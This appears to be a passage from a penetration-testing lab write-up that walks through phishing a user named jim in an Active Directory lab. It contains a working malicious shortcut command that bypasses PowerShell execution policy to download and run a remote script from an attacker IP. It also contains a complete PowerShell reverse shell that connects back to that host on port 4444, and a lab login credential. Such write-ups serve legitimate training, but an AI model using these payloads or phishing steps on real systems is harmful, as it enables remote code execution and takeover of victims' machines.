BOX14

Fishing

We discovered mail address jim@relia.com on the BOX249. Also, the BOX189 has smtp(hMailServer), which can deliver mails inside of AD.

Using this functionality, we can send fishing mail against jim.

To create fishing mail, we need several components.

1. @config.Library-ms

2. @body.txt

3. Directory to share malicious file.

4. Malicious file to execute itself and .lnk file navigating to malicious file.

There are several ways to construct malicious file, but the fastest way is to use actual Windows GUI. We have credential offsec / lab to logon to BOX250 with RDP. Let's use it.

My favorite RDP client is remmina. Enter WINPREPP(.250) port and login credeintial.

Then, right click desktop and open shortcut creation tab. Then, enter below code :

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.246/shell.ps1')"

Then, we successfully created DownloadString shortcut to execute malicious code.

Please install it to your machine.

Next, we need shell.ps1 which include reverse shell code.

$client = New-Object System.Net.Sockets.TCPClient('192.168.45.246',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
